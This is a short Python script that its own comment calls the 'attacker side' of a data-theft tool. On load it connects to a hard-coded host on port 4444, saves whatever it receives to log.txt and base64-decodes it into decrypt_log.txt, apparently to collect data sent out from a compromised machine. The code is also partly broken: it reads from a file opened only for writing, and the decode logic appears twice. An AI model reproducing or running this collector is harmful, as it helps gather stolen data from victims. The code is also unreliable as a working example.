import socket, sys, threading, os
from src import base64cipher
from time import sleep

host, port = '192.168.1.177', 4444


class recv_data:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.connect((host, port))

    def __init__(self):
        data = self.mysocket.recv(1024)
        f = open('log.txt', 'wb')
        while data != bytes(''.encode()):
            # print(data)
            f.write(data)
            data = self.mysocket.recv(1024)
        fdecrypt = open('decrypt_log.txt', 'a')
        for line in f:
            print(1)
            fdecrypt.write(base64cipher.decodeMsg(line))
        fdecrypt.flush()
        f.flush()

    # This class describe the attacker side
    def decode_text(self):
        print(1)
        flog = open('log.txt', 'r')
        fdecrypt = open('decrypt_log.txt', 'a')
        for line in flog:
            print(1)
            fdecrypt.write(base64cipher.decodeMsg(line))
        fdecrypt.flush()
        os.fsync(fdecrypt.fileno())
        flog.close()
        fdecrypt.close()


re = recv_data()

